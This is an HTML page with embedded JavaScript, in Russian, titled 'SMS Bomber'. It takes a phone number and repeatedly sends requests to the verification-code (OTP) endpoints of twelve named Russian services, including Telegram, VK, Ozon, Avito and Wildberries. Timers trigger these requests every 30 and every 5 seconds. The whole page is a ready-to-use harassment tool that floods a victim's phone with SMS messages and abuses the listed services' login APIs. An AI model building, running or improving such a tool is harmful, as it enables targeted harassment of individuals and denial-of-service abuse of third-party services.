<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
<title>SMS Bomber</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0e14;color:#e2e8f0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#121720;border:1px solid #1e2836;border-radius:16px;padding:28px 22px;max-width:400px;width:100%;text-align:center}
h2{font-size:22px;margin-bottom:6px;color:#fff}
.sub{font-size:12px;color:#64748b;margin-bottom:20px}
input{width:100%;padding:14px;background:#0a0e14;border:1px solid #1e2836;border-radius:10px;color:#fff;font-size:16px;text-align:center;font-family:inherit;margin-bottom:14px}
input:focus{outline:none;border-color:#3b82f6}
.btn{width:100%;padding:15px;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit;margin-bottom:8px}
.btn-start{background:#10b981;color:#fff}
.btn-stop{background:#ef4444;color:#fff;display:none}
.btn:active{transform:scale(0.97)}
.stats{display:flex;justify-content:center;gap:20px;margin-top:16px}
.stats div{text-align:center}
.num{font-size:24px;font-weight:700;color:#10b981}
.lbl{font-size:10px;color:#64748b;margin-top:3px}
.log{background:#0a0e14;border:1px solid #1e2836;border-radius:8px;padding:10px;margin-top:14px;max-height:120px;overflow-y:auto;text-align:left;font-size:11px;color:#64748b;font-family:monospace}
</style>
</head>
<body>
<div class="card">
<h2>📱 SMS Bomber</h2>
<div class="sub">Введите номер телефона</div>

<input type="tel" id="phone" placeholder="+79161234567">

<button class="btn btn-start" id="btnStart" onclick="start()">🚀 Начать</button>
<button class="btn btn-stop" id="btnStop" onclick="stop()">⏹ Остановить</button>

<div class="stats">
<div><div class="num" id="sent">0</div><div class="lbl">Отправлено</div></div>
<div><div class="num" id="active">0</div><div class="lbl">Активных</div></div>
</div>

<div class="log" id="log"></div>
</div>

<script>
var running=false;
var sent=0;
var timers=[];

var services=[
{name:"Telegram",url:"https://my.telegram.org/auth/send_password",data:"phone=",method:"POST"},
{name:"VK",url:"https://vk.com/rest.php?act=register&method=sendSMS&phone=",method:"GET"},
{name:"Ozon",url:"https://www.ozon.ru/api/entrypoint/login.bx?sendOtp=true&phone=",method:"GET"},
{name:"SberMarket",url:"https://sbermarket.ru/api/v2/auth/send_code?phone=",method:"GET"},
{name:"YouDo",url:"https://youdo.com/api/auth/send-code?phone=",method:"GET"},
{name:"DeliveryClub",url:"https://api.delivery-club.ru/auth/send_code?phone=",method:"GET"},
{name:"Avito",url:"https://www.avito.ru/web/1/auth/send_code?phone=",method:"GET"},
{name:"Wildberries",url:"https://www.wildberries.ru/webapi/auth/sendcode?phone=",method:"GET"},
{name:"YandexEda",url:"https://eda.yandex.ru/api/v1/user/send_auth_code?phone=",method:"GET"},
{name:"Citilink",url:"https://www.citilink.ru/registration/sendSms/?phone=",method:"GET"},
{name:"MVideo",url:"https://www.mvideo.ru/internal-rest-api/common/atg/send_code?phone=",method:"GET"},
{name:"DNS",url:"https://www.dns-shop.ru/auth/send-sms/?phone=",method:"GET"},
];

function logMsg(msg){
var log=document.getElementById('log');
log.innerHTML='['+new Date().toLocaleTimeString()+'] '+msg+'<br>'+log.innerHTML;
if(log.children.length>50)log.removeChild(log.lastChild);
}

function send(service,phone){
var url=service.url;
if(service.method==="GET"){
url+=encodeURIComponent(phone);
fetch(url,{mode:"no-cors"}).then(function(){sent++;document.getElementById('sent').textContent=sent;logMsg('✅ '+service.name)}).catch(function(){logMsg('❌ '+service.name)});
}else{
fetch(url,{method:"POST",mode:"no-cors",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:service.data+encodeURIComponent(phone)}).then(function(){sent++;document.getElementById('sent').textContent=sent;logMsg('✅ '+service.name)}).catch(function(){logMsg('❌ '+service.name)});
}
}

function start(){
var phone=document.getElementById('phone').value.trim();
if(!phone){alert('Введите номер телефона');return}
if(phone.length<10){alert('Некорректный номер');return}
if(!phone.startsWith('+'))phone='+'+phone;

running=true;
sent=0;
document.getElementById('sent').textContent='0';
document.getElementById('btnStart').style.display='none';
document.getElementById('btnStop').style.display='block';
logMsg('🔥 НАЧАЛО на '+phone);

services.forEach(function(s){send(s,phone)});
document.getElementById('active').textContent=services.length;

var t=setInterval(function(){
if(!running){clearInterval(t);return}
services.forEach(function(s){send(s,phone)});
document.getElementById('active').textContent=services.length;
},30000);
timers.push(t);

var t2=setInterval(function(){
if(!running){clearInterval(t2);return}
var s=services[Math.floor(Math.random()*services.length)];
send(s,phone);
},5000);
timers.push(t2);
}

function stop(){
running=false;
timers.forEach(function(t){clearInterval(t)});
timers=[];
document.getElementById('btnStart').style.display='block';
document.getElementById('btnStop').style.display='none';
document.getElementById('active').textContent='0';
logMsg('⏹ СТОП. Отправлено: '+sent);
}
</script>
</body>
</html>
